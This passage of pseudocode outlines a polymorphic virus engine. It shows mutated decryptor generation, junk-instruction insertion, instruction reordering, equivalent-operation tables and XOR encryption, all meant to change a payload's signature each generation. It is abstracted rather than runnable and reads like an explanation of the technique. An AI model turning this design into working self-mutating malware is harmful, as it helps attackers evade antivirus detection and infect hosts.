    mark_infection_marker(host)


// ============================================
// 3. THE POLYMORPHIC ENGINE (Mutation Strategies)
// ============================================
function generate_mutated_decryptor(key, payload_length):
    // A polymorphic engine rewrites the decryptor using
    // functionally equivalent but structurally different code.

    // Select randomization parameters for this generation
    registers = pick_random_register_set(3)          // EAX/EBX/ECX, etc.
    loop_type = pick_random([FOR_LOOP, WHILE_DECREMENT, JMP_TABLE])
    math_ops  = pick_equivalent_operations()            // ADD vs SUB/NEG, etc.

    // Build decryptor from parameterized templates
    code = ""

    // 3a. Random prologue (junk insertion / nop sleds)
    code += generate_random_junk_instructions(rand(2, 8))

    // 3b. Initialization (different registers, different orderings)
    code += initialize(registers.ptr, start_of_encrypted_body)
    code += initialize(registers.counter, payload_length)
    code += initialize(registers.key, key)

    // 3c. Decryption loop with equivalent instruction variants
    if loop_type == FOR_LOOP:
        code += label("loop_start")
        code += load_byte(registers.temp, [registers.ptr])
        code += decrypt_byte(registers.temp, registers.key, math_ops)  // XOR/ADD/SUB etc.
        code += store_byte([registers.ptr], registers.temp)
        code += increment(registers.ptr, math_ops.increment_style)       // INC vs ADD 1, etc.
        code += decrement(registers.counter, math_ops.decrement_style) // DEC vs SUB 1, etc.
        code += conditional_jump_not_zero("loop_start")
    else if loop_type == WHILE_DECREMENT:
        // Functionally identical but structurally different control flow
        code += label("loop_start")
        code += decrypt_byte(...)  // Inline slightly different sequence
        code += decrement(registers.ptr, payload_length)  // Count down instead of up
        code += conditional_jump_not_zero("loop_start")

    // 3d. Random epilogue (more dead code to change hash/signature)
    code += generate_random_junk_instructions(rand(3, 12))
    code += jump_to_decrypted_payload()

    // 3e. Permutation: reorder independent instructions where possible
    code = reorder_independent_instructions(code)

    return assemble_to_machine_code(code)


// ============================================
// 4. EQUIVALENT OPERATION SUBSTITUTIONS
// ============================================
function pick_equivalent_operations():
    // This is the heart of polymorphism. The engine maintains a table
    // of operations that produce the same mathematical result.
    equivalents = {
        "increment": ["ADD 1", "SUB -1", "LEA +1"],
        "negate":    ["NEG", "XOR 0xFF then ADD 1", "SUB from 0"],
        "decrypt":   ["XOR key", "ADD (complement) then NEG", "ROL/ROR variants"],
        "clear_reg": ["XOR reg, reg", "SUB reg, reg", "MOV reg, 0"],
        "nop":       ["NOP", "PUSH reg / POP reg", "OR reg, 0", "SHIFT reg, 0"]
    }
    return select_random_from(equivalents)


// ============================================
// 5. ENCRYPTION PRIMITIVE (Abstracted)
// ============================================
function encrypt(data, key, algorithm):
    if algorithm == "XOR_STREAM":
        for i from 0 to length(data)-1:
            data[i] = data[i] XOR key[i mod length(key)]
    return data
